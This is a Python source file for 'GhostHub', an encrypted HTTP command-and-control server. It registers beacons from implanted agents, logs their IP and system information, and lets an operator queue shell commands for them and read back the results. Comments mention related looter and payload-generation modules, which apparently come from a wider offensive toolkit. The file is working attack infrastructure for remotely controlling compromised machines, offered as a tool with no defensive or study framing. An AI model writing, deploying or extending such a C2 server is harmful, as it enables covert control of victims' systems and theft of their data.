"""
ghost_hub.py — GhostHub AES-Encrypted HTTP C2 Server
FIX 1: Removed unused 'from modules.looter import run_looter' (circular import risk).
FIX 2: Replaced questionary.ask_async() with sync questionary run in executor
        (ask_async is fragile across questionary versions and asyncio implementations).
FIX 3: asyncio task creation made safe with ensure_future inside running loop.
"""

import socket
import threading
import asyncio
import time
import json
import os
import questionary
from aiohttp import web
from cryptography.fernet import Fernet
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE

# NOTE: 'from modules.looter import run_looter' intentionally removed —
#       it was never used here and created a circular dependency chain.

console = Console()


class EncryptedBeaconHub:
    """AES-Encrypted HTTP C2 Listener — receives beacons, queues tasks."""

    def __init__(self, port=4445):
        self.port = port
        self.beacons = {}   # agent_id → {ip, last_seen, sysinfo}
        self.tasks = {}   # agent_id → [cmd, cmd, ...]
        self.cipher = None
        self._load_key()

    def _load_key(self):
        key_file = "logs/c2_aes.key"
        if not os.path.exists(key_file):
            console.print(
                "[yellow][!] No AES key found at logs/c2_aes.key. "
                "Generate a payload first to create the key.[/yellow]")
            return
        try:
            key = open(key_file).read().strip()
            self.cipher = Fernet(key.encode())
        except Exception as e:
            console.print(f"[red][!] Key load error: {e}[/red]")

    # ── aiohttp route handlers ───────────────────────────────────

    async def handle_ping(self, request):
        if not self.cipher:
            return web.Response(status=403, text="No cipher loaded")
        try:
            enc_data = await request.text()
            data = json.loads(self.cipher.decrypt(enc_data.encode()).decode())
            agent_id = data.get('id')

            if agent_id and agent_id not in self.beacons:
                console.print(
                    f"\n[bold green][+] NEW BEACON: {request.remote} "
                    f"(ID: {agent_id})[/bold green]")

            if agent_id:
                self.beacons[agent_id] = {
                    'ip':        request.remote,
                    'last_seen': time.time(),
                    'sysinfo':   data.get('sysinfo', 'Unknown'),
                }

            # If there is a pending task, dispatch it
            if agent_id and agent_id in self.tasks and self.tasks[agent_id]:
                task_cmd = self.tasks[agent_id].pop(0)
                reply = self.cipher.encrypt(
                    json.dumps(
                        {"status": "task", "command": task_cmd}).encode()
                ).decode()
                return web.Response(text=reply)

            reply = self.cipher.encrypt(json.dumps(
                {"status": "sleep"}).encode()).decode()
            return web.Response(text=reply)

        except Exception as e:
            console.print(f"[dim red][!] Beacon ping error: {e}[/dim red]")
            return web.Response(status=500)

    async def handle_result(self, request):
        if not self.cipher:
            return web.Response(status=403)
        try:
            enc_data = await request.text()
            data = json.loads(self.cipher.decrypt(enc_data.encode()).decode())
            agent_id = data.get('id',     '?')
            result = data.get('result', '')
            console.print(
                f"\n[bold cyan]Result from Beacon {agent_id}:[/bold cyan]\n{result}")
            return web.Response(text="OK")
        except Exception as e:
            console.print(f"[dim red][!] Result handler error: {e}[/dim red]")
            return web.Response(status=500)

    async def start_server(self):
        app = web.Application()
        app.router.add_post('/api/v2/ping',   self.handle_ping)
        app.router.add_post('/api/v2/result', self.handle_result)
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', self.port)
        await site.start()
        console.print(
            f"[bold green][+] GhostHub listening on 0.0.0.0:{self.port}[/bold green]")


def _sync_input(prompt):
    """
    Run a blocking questionary prompt safely from an async context
    by executing it in a thread-pool executor so the event loop stays free.
    """
    return questionary.text(prompt, style=Q_STYLE).ask()


def run_ghost_hub():
    """Entry point — runs the async C2 server plus a sync operator console."""
    draw_header("GHOST-HUB C2 (Encrypted Network)")
    os.makedirs("logs", exist_ok=True)

    port_str = questionary.text(
        "Listen Port:", default="4445", style=Q_STYLE).ask()
    if not port_str:
        return
    port = int(port_str)

    hub = EncryptedBeaconHub(port=port)

    # ── Async server loop ─────────────────────────────────────────
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    # Start server in background thread so operator console stays interactive
    server_thread = threading.Thread(
        target=lambda: loop.run_until_complete(hub.start_server()),
        daemon=True
    )
    server_thread.start()
    time.sleep(0.5)   # let server bind before printing prompt

    console.print(Panel(
        f"[bold white]C2 active on port {port}[/bold white]\n\n"
        "[dim cyan]Commands:\n"
        "  [bold]task <ID> <command>[/bold]  — queue a shell command for a beacon\n"
        "  [bold]beacons[/bold]             — list active beacons\n"
        "  [bold]exit[/bold]               — shut down GhostHub[/dim cyan]",
        border_style="red", title="GHOST-HUB"
    ))

    # ── Operator console (sync) ───────────────────────────────────
    while True:
        try:
            # Print beacon table if any are active
            if hub.beacons:
                table = Table(title="Active Beacons", border_style="red")
                table.add_column("ID",        style="cyan")
                table.add_column("IP",        style="white")
                table.add_column("SysInfo",   style="dim")
                table.add_column("Last Seen", style="dim")
                for bid, d in hub.beacons.items():
                    ago = int(time.time() - d['last_seen'])
                    table.add_row(str(bid), d['ip'],
                                  d['sysinfo'], f"{ago}s ago")
                console.print(table)

            cmd_raw = questionary.text(
                "GhostHub > ", style=Q_STYLE).ask()

            if not cmd_raw:
                continue

            parts = cmd_raw.strip().split(maxsplit=2)
            verb = parts[0].lower() if parts else ""

            if verb == "exit":
                console.print("[yellow][*] Shutting down GhostHub...[/yellow]")
                break

            elif verb == "beacons":
                if not hub.beacons:
                    console.print("[yellow]No beacons connected yet.[/yellow]")

            elif verb == "task":
                if len(parts) < 3:
                    console.print(
                        "[red]Usage: task <Beacon_ID> <command>[/red]")
                    continue
                bid, command = parts[1], parts[2]
                if bid not in hub.beacons:
                    console.print(f"[red]Unknown beacon ID: {bid}[/red]")
                    continue
                if bid not in hub.tasks:
                    hub.tasks[bid] = []
                hub.tasks[bid].append(command)
                console.print(
                    f"[green][+] Task queued for beacon {bid}.[/green]")

            else:
                console.print(f"[yellow]Unknown command: {verb}[/yellow]")

        except KeyboardInterrupt:
            console.print("\n[yellow][*] Exiting GhostHub...[/yellow]")
            break


if __name__ == "__main__":
    run_ghost_hub()
